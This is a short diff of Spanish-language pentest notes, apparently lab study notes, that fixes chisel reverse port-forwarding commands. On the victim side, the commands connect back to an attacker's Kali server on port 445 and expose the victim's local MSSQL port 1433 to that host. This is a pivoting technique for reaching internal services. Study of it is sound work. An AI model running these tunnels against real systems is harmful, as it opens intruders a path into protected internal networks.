@@ -38,7 +38,7 @@
 - `./chisel server --port 445 --reverse`
 
 ### Maquina victima:
-- `.\chisel.exe client 192.168.45.210 R:1433:127.0.0.1:1433`
-    - `chisel client KALI_IP R:PORT:LOCALHOST:PORT`
+- `.\chisel.exe client 192.168.45.210:445 R:1433:127.0.0.1:1433`
+    - `chisel client KALI_IP:PORT R:PORT:LOCALHOST:PORT`
         - Si justo estamos usando el puerto 1433 en nuestro kali para otra cosa podemos usar otro puerto
-        - ``.\chisel.exe client 192.168.45.210 R:15432:127.0.0.1:1433`
+        - ``.\chisel.exe client 192.168.45.210:445 R:15432:127.0.0.1:1433`
